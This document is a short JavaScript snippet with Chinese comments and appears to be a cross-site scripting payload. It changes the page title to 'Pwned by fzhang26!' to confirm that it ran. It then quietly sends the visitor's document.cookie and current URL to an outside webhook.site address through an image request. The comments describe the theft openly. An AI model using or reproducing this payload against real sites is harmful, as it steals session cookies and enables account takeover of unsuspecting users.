// 改一下网页标题，方便你确认代码真的执行了
document.title = "Pwned by fzhang26!";

// 偷偷把 Cookie 发到你的 Webhook
new Image().src = "https://webhook.site/317cc916-ee20-43cf-9f91-3b0860b9558c/?c=" 
  + encodeURIComponent(document.cookie) 
  + "&u=" + encodeURIComponent(location.href);
